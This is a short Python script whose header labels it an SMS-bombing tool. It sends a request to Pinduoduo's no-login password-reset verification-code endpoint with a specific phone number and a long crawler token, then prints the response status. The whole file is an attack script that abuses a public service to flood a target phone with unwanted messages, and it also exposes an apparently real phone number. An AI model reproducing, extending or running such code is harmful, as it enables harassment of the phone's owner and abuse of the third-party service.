# -*- coding: utf-8 -*-
# @Time : 2021/4/26 10:58
# @Author : dujun
# @describe : 短信轰炸
# @File : bomb_message.py
import requests


class Test_SMS:

    def test_sendMessage(self):
        # 拼多多忘记密码
        url = 'https://mms.pinduoduo.com/janus/api/mobile/sendVerificationCode/noLogin'
        head = ''
        data = str({"type": 15, "mobile": "17637898368",
                    "crawlerInfo": "0apWfxUkM_VefaHofs-gilQ4KDzGnWekcTqCB6ck83CqN5V4BfN90G47zmD7_ZS-fTvsso1LRCMshOzklD--le0Fz3qCI3RmMfldSfIEF-IFE3_DSsIpv235U3TT7KsVLH-6ZL6DjaJ70JFd9acUPac0pjXUvqnUuycY6vnYTacdTaOd4aXGujn9xKuPIaD_GPptYXH4xFH5SYYIYfYuZGjdCvXs0d4Vem--xuHRPvKB2HKBzVH99EXdtaztOxXn2vu4a1qvOndFraYpw_nUuJjUXyvnGaiTSxiA2_qXHndsAxdFrQYn_7uXbHqujQjGe6LivxXU9JyGgazVZQdgKOqKmKDn4PtE2QY4FtYNV1ptSPXEQQYNhXiFRcNNJjtNYaGq1Q0CsYtO1PN5Fyr5se3T_3JKlEF18CMGk9Pcd91N9ZJ45Hqi43JYFbHAuFI5J_XcrzAqm7nOkG6_7Kw9tKC5TuHTCFWw"})
        re = requests.post(url=url, headers=head, data=data)
        print(re.status_code)
